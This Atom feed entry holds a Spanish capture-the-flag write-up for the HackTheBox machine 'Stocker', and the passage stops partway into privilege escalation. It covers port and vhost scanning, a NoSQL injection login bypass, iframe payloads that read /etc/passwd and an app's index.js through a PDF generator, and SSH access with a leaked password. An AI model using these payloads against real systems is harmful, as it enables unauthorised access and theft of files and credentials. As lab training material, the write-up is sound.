<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-03-13T00:11:18-03:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Blog | Writeups de HTB</title><subtitle>Blog de seguridad informatica</subtitle><author><name>VØ1DN3T</name></author><entry><title type="html">Stocker HackTheBox</title><link href="http://localhost:4000/writeup-stocker/" rel="alternate" type="text/html" title="Stocker HackTheBox" /><published>2023-03-12T00:00:00-03:00</published><updated>2023-03-12T00:00:00-03:00</updated><id>http://localhost:4000/writeup-stocker</id><content type="html" xml:base="http://localhost:4000/writeup-stocker/">&lt;p&gt;Buenas a todos, este es mi primer writeup, en esta ocación vamos a resolver una maquina linux llamada stocker de HackTheBox lo cual es está catalogada como easy, espero que disfruten el contenido.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-stocker/Stocker.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Empezamos a escanear para decubrir puertos abiertos en la maquina&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt; 5000 &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-vvv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; 10.10.11.196
Host discovery disabled &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; All addresses will be marked &lt;span class=&quot;s1&quot;&gt;&apos;up&apos;&lt;/span&gt; and scan &lt;span class=&quot;nb&quot;&gt;times &lt;/span&gt;may be slower.
Starting Nmap 7.93 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2023-03-12 21:37 &lt;span class=&quot;nt&quot;&gt;-03&lt;/span&gt;
Initiating SYN Stealth Scan at 21:37
Scanning 10.10.11.196 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;65535 ports]
Discovered open port 22/tcp on 10.10.11.196
Discovered open port 80/tcp on 10.10.11.196
Increasing send delay &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.11.196 from 0 to 5 due to max_successful_tryno increase to 4
Increasing send delay &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.11.196 from 5 to 10 due to max_successful_tryno increase to 5
Completed SYN Stealth Scan at 21:37, 16.48s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;65535 total ports&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.11.196
Host is up, received user-set &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.18s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Scanned at 2023-03-12 21:37:28 &lt;span class=&quot;nt&quot;&gt;-03&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;17s
Not shown: 65533 closed tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;reset&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Luego seguimos con el escaneo de puertos para ver que versiones y servicios tiene&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;-sCV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p22&lt;/span&gt;,80 10.10.11.196
Starting Nmap 7.93 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2023-03-12 21:47 &lt;span class=&quot;nt&quot;&gt;-03&lt;/span&gt;
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.11.196
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.17s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| ssh-hostkey: 
|   3072 3d12971d86bc161683608f4f06e6d54e &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|   256 7c4d1a7868ce1200df491037f9ad174f &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_  256 dd978050a5bacd7d55e827ed28fdaa3b &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
80/tcp open  http    nginx 1.18.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_http-server-header: nginx/1.18.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_http-title: Did not follow redirect to http://stocker.htb &amp;lt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;
Service Info: OS: Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Vemos que nmap en el puerto 80 nos reportó un dominio, otra forma para descubrir el dominio es tirando de curl&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
❯ curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; 10.10.11.196 &lt;span class=&quot;nt&quot;&gt;-I&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;Location
Location: http://stocker.htb
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Ya que tenemos un dominio es tan solo agregarlo en el archivo /etc/hosts&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
127.0.0.1       localhost
127.0.1.1       voidnet
10.10.11.196 stocker.htb
&lt;span class=&quot;c&quot;&gt;# The following lines are desirable for IPv6 capable hosts&lt;/span&gt;
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Revisemos la web&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-stocker/pagina.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora que tenemos un dominio intentemos buscar directorios ocultos con gobuster&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ gobuster &lt;span class=&quot;nb&quot;&gt;dir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://stocker.htb &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; 100

&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
Gobuster v3.5
by OJ Reeves &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;@TheColonial&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &amp;amp; Christian Mehlmauer &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;@firefart&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Url:                     http://stocker.htb
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Method:                  GET
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Threads:                 100
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Negative Status codes:   404
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] User Agent:              gobuster/3.5
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Timeout:                 10s
&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
2023/03/12 22:07:03 Starting gobuster &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;directory enumeration mode
&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
/img                  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 301&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Size: 178] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; http://stocker.htb/img/]
/css                  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 301&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Size: 178] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; http://stocker.htb/css/]
/js                   &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 301&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Size: 178] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; http://stocker.htb/js/]
/fonts                &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 301&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Size: 178] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; http://stocker.htb/fonts/]
Progress: 9028 / 220561 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;4.09%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;^C
&lt;span class=&quot;o&quot;&gt;[!]&lt;/span&gt; Keyboard interrupt detected, terminating.

&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
2023/03/12 22:07:20 Finished
&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Podemos ver que nos reporto un directorio llamado fonts, veamos con que nos encontramos&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-stocker/direc.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;vemos que no hay nada, intentemos buscar subdirectorios&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
 gobuster vhost &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://stocker.htb &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; 100 &lt;span class=&quot;nt&quot;&gt;--no-error&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
Gobuster v3.5
by OJ Reeves &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;@TheColonial&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &amp;amp; Christian Mehlmauer &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;@firefart&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Url:             http://stocker.htb
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Method:          GET
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Threads:         100
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Wordlist:        /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] User Agent:      gobuster/3.5
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Timeout:         10s
&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
2023/03/12 22:15:04 Starting gobuster &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;VHOST enumeration mode
&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
Found: dev.stocker.htb &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 302&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Size: 28]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Encontramos un subdominio, ahora es tan solo agregarlo al /etc/hosts&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;10.10.11.196 dev.stocker.htb&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; /etc/hosts

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Ingresemos a la web&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-stocker/pag.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Podemos ver que tenemos un login, intente bypasear el login comprobando si es vulnerable a los ataques sqli pero no tuve resultados, despues de muchos intento con 
BurpSuite me di cuenta que puedo cambiar las peticiones para causar ataques NoSqli&lt;/p&gt;

&lt;p&gt;Al interceptar por BurpSuite nos muestra esto&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
POST /login HTTP/1.1

Host: dev.stocker.htb

User-Agent: Mozilla/5.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;X11&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; Linux x86_64&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; rv:102.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Gecko/20100101 Firefox/102.0

Accept: text/html,application/xhtml+xml,application/xml&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0.9,image/avif,image/webp,&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0.8

Accept-Language: en-US,en&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0.5

Accept-Encoding: &lt;span class=&quot;nb&quot;&gt;gzip&lt;/span&gt;, deflate

Content-Type: application/x-www-form-urlencoded

Content-Length: 29

Origin: http://dev.stocker.htb

Connection: close

Referer: http://dev.stocker.htb/login

Cookie: connect.sid&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;s%3AeehRhX_wEYQcXzjWxltuGkOJ0T8tYaa_.iO7JxTfBZdxcPOUdjeU3uGBLRc9P4jRifl0bGfz0Jx8

Upgrade-Insecure-Requests: 1


&lt;span class=&quot;nv&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;admin&amp;amp;password&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;admin
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ahora para hacer el ataque NoSqli tenemos que ejecutar donde esta el apartado username=admin…. con este script&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;username&quot;&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$ne&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;: null&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;password&quot;&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$ne&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;: null&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Pero antes donde dice content-Type tenemos que poner esto&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;application/json
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Y nos quedaria algo asi&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-stocker/burp.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Finalmente le damos un FORWARD&lt;/p&gt;

&lt;p&gt;Miremos la web&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-stocker/pagina2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Al darle view cart nos muesta esto, es como si fuera una tienda y podemos agregar cosas al carrito para comprar&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-stocker/compras.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Agregamos algo al carrito y le damos View Cart nos muestra esto&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-stocker/compras2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Le damos a submit y nos muestra como un identificador y un enlace en HERE&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-stocker/compras3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si le damos a HERE nos redirige a /api/po/ y al identificador que nos termina mostrando un pdf&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-stocker/pdf.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Volvemos a interceptar con Burp y le damos submit&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-stocker/submit.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vemos una estructura en json&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-stocker/json.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;En el apartado title podemos modificar  y pasarle una estructura que tenga un archivo un ejemplo es el /etc/passwd&lt;/p&gt;

&lt;h2 id=&quot;codigo&quot;&gt;Codigo&lt;/h2&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;iframe &lt;span class=&quot;nv&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;file:///etc/passwd &lt;span class=&quot;nv&quot;&gt;height&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;750px &lt;span class=&quot;nv&quot;&gt;width&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;750px&amp;gt;&amp;lt;/iframe&amp;gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Miramos en el repeater que a la derecha luego de ejecutar el codigo nos muestra una id&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-stocker/id.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Copiamos ese id y lo pegamos donde esta el pdf para que nos muestre el /etc/passwd&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-stocker/pdf2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si prestamos atencion al archivo podemos ver que hay un usuario que se llama angoose&lt;/p&gt;

&lt;p&gt;Puedo pensas que al tener un subdominio llamado dev tengo entendido que /var/www/dev/index.js sea un archivo de configuración valido&lt;/p&gt;

&lt;p&gt;Si ejecutamos este script, copiamos el id y lo pegamos donde está el pdf&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-Bash&quot;&gt;&quot;&amp;lt;iframe src=file:///var/www/dev/index.js height=800px width=800px&amp;gt;&amp;lt;/iframe&amp;gt;&quot;

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Deberiamos ver el index.js en el pdf claramente&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-stocker/burpsuite.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-stocker/id2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Donde marque, podemos ver que el archivo se conecta a mongodb que tiene una contraseña, podemos pobra esa contraseña para poder conectarnos 
con ssh con el usuario angoose&lt;/p&gt;

&lt;p&gt;Nos conectamos por ssh&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
❯ ssh angoose@10.10.11.196
The authenticity of host &lt;span class=&quot;s1&quot;&gt;&apos;10.10.11.196 (10.10.11.196)&apos;&lt;/span&gt; can&lt;span class=&quot;s1&quot;&gt;&apos;t be established.
ED25519 key fingerprint is SHA256:jqYjSiavS/WjCMCrDzjEo7AcpCFS07X3OLtbGHo/7LQ.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added &apos;&lt;/span&gt;10.10.11.196&lt;span class=&quot;s1&quot;&gt;&apos; (ED25519) to the list of known hosts.
angoose@10.10.11.196&apos;&lt;/span&gt;s password: IHeardPassphrasesArePrettySecure 
Last login: Sun Mar 12 23:53:34 2023 from 10.10.16.39
angoose@stocker:~&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;angoose@stocker:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ifconfig
eth0: &lt;span class=&quot;nv&quot;&gt;flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4163&amp;lt;UP,BROADCAST,RUNNING,MULTICAST&amp;gt;  mtu 1500
        inet 10.10.11.196  netmask 255.255.254.0  broadcast 10.10.11.255
        ether 00:50:56:b9:d8:2d  txqueuelen 1000  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ethernet&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        RX packets 585090  bytes 75834889 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;75.8 MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 592998  bytes 176522802 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;176.5 MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: &lt;span class=&quot;nv&quot;&gt;flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;73&amp;lt;UP,LOOPBACK,RUNNING&amp;gt;  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Local Loopback&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        RX packets 23722  bytes 4015190 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;4.0 MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 23722  bytes 4015190 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;4.0 MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

angoose@stocker:~&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Hacemos ls y ya podemos ver la primera flag&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
angoose@stocker:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls
&lt;/span&gt;flag.js  user.txt
angoose@stocker:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;user.txt
ca4&lt;span class=&quot;k&quot;&gt;*************************&lt;/span&gt;7d
angoose@stocker:~&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;escala-de-privilegios&quot;&gt;Escala de privilegios&lt;/h2&gt;

&lt;p&gt;Si hacemos sudo -l vemos que podemos ejecutar cualquier js con node&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
angoose@stocker:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;angoose: IHeardPassphrasesArePrettySecure 
Matching Defaults entries &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;angoose on stocker:
